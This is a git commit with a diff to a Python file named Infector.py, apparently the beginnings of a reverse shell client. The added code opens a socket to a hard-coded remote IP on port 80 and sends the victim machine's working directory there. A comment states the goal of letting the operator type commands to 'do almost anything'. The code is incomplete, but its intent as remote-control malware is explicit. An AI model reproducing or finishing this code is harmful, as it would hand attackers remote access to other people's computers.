c5158e5c96a3f3c6b61a0e470b55906c1a044314
red2922 <jinthavongsa1@gmail.com>
2023-05-09 09:40:29 -0500

    Successful returned pwd

--- Infector.py
+++ Infector.py
@@ -4,18 +4,23 @@ import subprocess
 import sys
 
 
-s = socket.socket() # Creats a socket 
+s = socket.socket()
 
 Name = socket.gethostname() #Gets name of Device
-Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the current Device
+Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device
 
-
-
-Port = 80 # Port 80 HTTP
-
+#get IP Address of Current Machine
+Port = 80
+BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
+SEPARATOR = "<sep>"
 
-# connect to the server. (IP address of Host is needed. Find a way to completely bypass this)
-s.connect(('10.67.98.152', Port)) #Hard coded. Change to your computer's IP in order to test code
+# connect to the server
+s.connect(('10.67.98.152', Port))
 
+cwd = os.getcwd() #Sets cwd to os.getcwd()
+
+s.send(cwd.encode()) #Sends the cwd to the Host
+
+#Need to make it so you can just type in commands and allows to do almost anything. 
 
